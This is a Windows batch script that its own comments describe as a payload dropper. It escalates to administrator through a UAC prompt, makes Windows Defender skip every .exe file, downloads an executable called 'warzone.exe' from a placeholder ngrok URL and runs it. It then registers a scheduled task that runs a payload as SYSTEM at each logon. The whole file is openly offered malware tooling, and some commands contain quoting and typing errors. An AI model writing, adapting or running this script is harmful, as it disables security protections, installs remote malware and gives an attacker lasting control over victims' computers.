REM A bat file that runs automatically as administrator.
REM Downloads our payload using powershell.
REM Instructs Windows Defender to exclude any exe files.


@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------
Powershell -Command "Set-MpPreference -ExclusionExtension exe"
cd %TEMP%
Powershell -Command "Invoke-Webrequest 'https://ngrok-Link/warzone.exe' -OutFile mod.exe"
mod.exe
:--------------------------------------
REM Persistence method using Powershell to scheduled task
Powershell -Command "$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\payload.exe""
Powershell -Command "$T = New-ScheduledTaskTrigger -AtLogOn -User "username""
Powershell -Command "$S = New-ScheduledTaskSettingsSet"
Powershell -Command "$P = New-ScheduledTaskPrincipal "NT AUTHORITY\SYSTEM" -RunLevel Highest"
Powershell -Command "$D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S"
Powershell -Command "Register-ScheduledTask NameTheTask -InputObjec $D"
